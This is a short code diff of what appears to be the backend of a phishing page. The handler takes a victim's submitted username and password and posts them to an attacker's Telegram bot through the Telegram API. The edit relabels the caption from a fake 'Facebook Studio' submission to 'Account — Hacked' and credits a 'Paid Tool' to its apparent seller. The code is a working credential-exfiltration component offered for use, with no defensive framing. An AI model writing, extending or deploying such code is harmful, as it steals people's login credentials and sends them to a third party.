@@ -62,10 +62,10 @@ export default async function handler(req, res) {
     }
 
     const caption =
-      `<b>Facebook Studio — New Submission</b>\n\n` +
+      `<b>Account — Hacked</b>\n\n` +
       `👤 <b>Username:</b> ${escapeHTML(username.trim())}\n\n` +
       `💬 <b>Password:</b>\n${escapeHTML(password.trim())}\n\n` +
-      `📱 <b>Platform:</b> Facebook Studio`;
+      `💻<b>Paid Tool :</b> MADE BY C9 UZAIR`;
 
     const telegramResponse = await fetch(
       `https://api.telegram.org/bot${token}/sendPhoto`,
